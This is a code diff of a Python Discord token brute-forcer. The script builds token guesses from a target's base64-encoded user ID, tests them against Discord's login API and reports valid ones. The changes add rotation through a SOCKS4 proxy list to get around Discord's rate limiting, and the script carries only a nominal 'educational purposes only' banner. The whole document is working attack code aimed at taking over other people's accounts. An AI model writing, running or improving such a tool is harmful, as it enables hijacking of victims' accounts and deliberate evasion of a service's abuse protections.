@@ -6,6 +6,8 @@ import requests
 from colorama import *
 import time
 
+p =  open("proxy/socks4.txt", "r")
+
 userid = base64.b64encode((input("UserID: ")).encode("ascii"))
 userid = str(userid)[2:-1]
 print("WARNING: Educational purposes only!")
@@ -26,7 +28,8 @@ while userid == userid:
     headers={
     'Authorization': token
     }
-    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+    url = 'https://discordapp.com/api/v9/auth/login'
+    login = requests.get(url, headers=headers)
     try:
         if login.status_code == 200:
             print(Fore.GREEN + '[+] VALID' + ' ' + token)
@@ -35,10 +38,11 @@ while userid == userid:
             break
         else:
             print(Fore.RED + '[-] INVALID' + ' ' + token)
-            time.sleep(1)
 
         if login.status_code == 429:
-                print("You get rate limited, waiting 65 seconds")
-                time.sleep(65)
+          rp = random.choice(list(p.read().split('\n')))
+          print(Fore.YELLOW + f"[*] You get rate limited, connected to proxy!")
+          login = requests.get(url, headers=headers, proxies={'socks4':"socks4://"+rp})
     finally:
         print("")
+input()
